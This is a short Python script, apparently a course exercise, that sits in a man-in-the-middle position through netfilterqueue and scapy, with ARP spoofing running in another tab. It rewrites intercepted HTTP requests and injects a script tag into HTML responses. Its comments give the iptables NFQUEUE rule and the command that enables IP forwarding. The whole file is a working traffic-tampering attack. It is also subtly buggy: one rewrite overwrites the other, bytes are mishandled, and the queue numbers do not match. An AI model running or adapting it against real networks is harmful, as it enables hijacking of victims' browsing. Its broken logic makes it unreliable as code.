#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

# before anything run the below command in you machine
# creating queue to trap incoming packets
## iptables -I FORWARD -j NFQUEUE --queue-num 0
## echo 1 > /proc/sys/net/ipv4/ip_forward

# to test search for speedbit.com

# ARP spoof on one tab
# file interceptor on another

# In TCP layer if dport(dest port) is http it is a request and if sport(src port) is http then it is response
# sequence no in TCP layer of response is same as Ack no in TCP layer of request

# In raw layer of request we have "Accept-Encoding: gzip, deflate" this means that are browser can accept this encoding
# so we get HTML code in gibberish(encoded).

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # Http info is usually in RAW layer
    # print(scapy_packet.show())
    try:
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 8080:
                # print(scapy_packet[scapy.Raw].load)
                print("[+] Requested Packet")

                new_load = re.sub(r"Accept-Encoding:.*?\\r\\n", "", str(scapy_packet[scapy.Raw].load))
                new_load = str(scapy_packet[scapy.Raw].load).replace("HTTP/1.1", "HTTP/1.0")
                scapy_packet[scapy.Raw].load = new_load
                # print(new_load)
                # removing chksum and len field that may corrupt our modified packet from ip layer
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.IP].len
                # removing chksum field that may corrupt our modified packet from udp layer
                del scapy_packet[scapy.TCP].chksum
                # deleting helps us as scapy will include these fields itself after calculating them
                packet.set_payload(bytes(scapy_packet))
                # print(new_load)
            elif scapy_packet[scapy.TCP].sport == 8080:
                print("[+] Response Packet")
                load = str(scapy_packet[scapy.Raw].load)
                new_load = load.replace("</BODY>", "<SCRIPT>alert('alert')</SCRIPT></BODY>")
                # print(new_load)
                scapy_packet[scapy.Raw].load = new_load
                # removing chksum and len field that may corrupt our modified packet from ip layer
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.IP].len
                # removing chksum field that may corrupt our modified packet from udp layer
                del scapy_packet[scapy.TCP].chksum
                # deleting helps us as scapy will include these fields itself after calculating them
                packet.set_payload(bytes(scapy_packet))
                # print(scapy_packet.show())
        packet.accept()

    except Exception as e:
        print(e, end="")


queue = netfilterqueue.NetfilterQueue()
queue.bind(2, process_packet)
queue.run()
